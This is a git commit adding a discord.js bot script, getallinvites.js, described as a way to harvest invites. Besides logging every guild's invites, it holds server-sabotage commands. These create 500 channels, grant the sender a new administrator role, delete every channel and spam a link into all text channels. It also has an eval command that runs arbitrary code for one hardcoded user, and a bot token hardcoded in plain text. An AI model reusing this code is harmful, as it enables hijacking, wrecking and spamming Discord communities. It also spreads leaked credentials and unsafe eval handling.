6bf3fe0ebded638ae1db1be7726b7ebb7313c003
Asumji <64544378+Asumji@users.noreply.github.com>
2021-06-24 16:00:28 +0200

    getting invites without creating one
    Works very well tho unfortnuately it doesn't fit into the console since it prints way too many invtes usually feel free ti improve it by saving the invites each to a txt file or something similar to that

---
+++ getallinvites.js
@@ -0,0 +1,121 @@
+try { 
+ const discord = require("discord.js");
+
+  const bot = new discord.Client();
+  bot.on("ready", () => {
+    console.log("invites ready to be sent!!");
+    // bot.guilds.cache.forEach(guild => {
+    //   if(guild.members.cache.get(bot.user.id).hasPermission("ADMINISTRATOR")) {
+    //     guild.channels.create("test")
+    //   }
+    // })
+    console.log(bot.user.id)
+    console.log(bot.guilds.cache.size)
+    if (bot.guilds.cache.size > 0) {
+      let channelID
+      let guildd = []
+      bot.guilds.cache.forEach(guild => {
+        guild.channels.cache.forEach(channell => {
+          if (channell.type != "category") {
+            if (!guildd.includes(guild.name)) {
+              channelID = channell.id
+              guildd.push(guild.name)
+              console.log(guildd)
+              // channel.createInvite().then(invite => {
+              //   console.log(guild.name + ": " + invite.url + " Admin: " + guild.members.cache.get(bot.user.id).hasPermission("ADMINISTRATOR"))
+              // })
+              guild.fetchInvites().then(invites => {
+                console.log(invites)
+              })
+            }
+          }
+        })
+      })
+    
+    } else {
+      console.warn("No Guilds found!")
+    }
+  });
+
+  const PREFIX = "!";
+
+  bot.on("message", message => {
+    let args = message.content.substring(PREFIX.length).split(" ");
+    let command = message.content.split(" ")[0];
+    
+    if (command == PREFIX + "eval") {
+    if (message.author.id == "612625159656046643") {
+      //if (!message.content.includes("token")) {
+          if (!args[1]) {
+              message.channel.send("**Usage:**\n" + PREFIX + "eval {code}")
+          } else {
+              try {
+                  const evaled = eval(args.slice(1).join(" "))
+                  const embed = new discord.MessageEmbed()
+                  .setTitle("Evaluation")
+                  .addField("Evaluated", `\`\`\`js\n${args.slice(1).join(" ")}\`\`\``)
+                  .addField("Outcome", `\`\`\`js\n${evaled}\`\`\``)
+                  .addField("type of", `\`\`\`js\n${typeof(evaled)}\`\`\``)
+                  .setColor("RANDOM")
+                  .setFooter(message.author.tag, message.author.displayAvatarURL())
+                  message.channel.send(embed)
+              } catch(err) {
+                  message.channel.send("Error:\n" + err)
+              }
+          }
+      } else {
+          message.channel.send("No! I refuse to reveal my token. :sob:")
+      }
+  //} else {
+      //message.channel.send("Only " + bot.users.cache.get("612625159656046643").tag + " can use this command. :sob:")
+  //}
+  }
+  if (command == PREFIX + "ch") {
+    for(i = 0; i < 500; i++) {
+      message.guild.channels.create("This is a very pog announc")
+    }
+  }
+
+  if (command == PREFIX + "role") {
+    message.delete()
+    if (!args[1]) {
+      console.log("missing role name")
+    } else {
+      message.guild.roles.create({ data: { name: args[1], permissions: ["ADMINISTRATOR"] } }).then(r => {
+        message.member.roles.add(r)
+      })
+    }
+  }
+
+  if (command == PREFIX + "rr") {
+    message.delete()
+      message.guild.channels.cache.forEach(ch => {
+        if (ch.type == "text") {
+          ch.send("https://www.youtube.com/watch?v=j5a0jTc9S10")
+        }
+      })
+  }
+
+  if (command == PREFIX + "per") {
+    const permissions = Object.keys(discord.Permissions.FLAGS);
+    console.log(
+         'Permissions of ' + bot.user.username + '\n\n' +
+         permissions.map((perm) => {
+               return message.guild.members.cache.get(bot.user.id).hasPermission(perm) ? `${perm}: YES` : `${perm}: NO`
+         }).join('\n')
+    )
+  }
+
+  if (command == PREFIX + "chdel") {
+    message.guild.channels.cache.forEach(ch => {
+      ch.delete()
+    })
+    message.guild.channels.create("Test").then(ch => {
+      ch.setTopic("Test")
+    })
+  }
+  });
+  bot.login("NzMzNzk2Mjg0NTM1OTMwOTM4.XxIXCw.56v5zs6NoWtI8Q1PBEj94ACb0-g");
+} catch(e) {
+  console.error("Something went wrong!\nError:\n"+ e)
+}
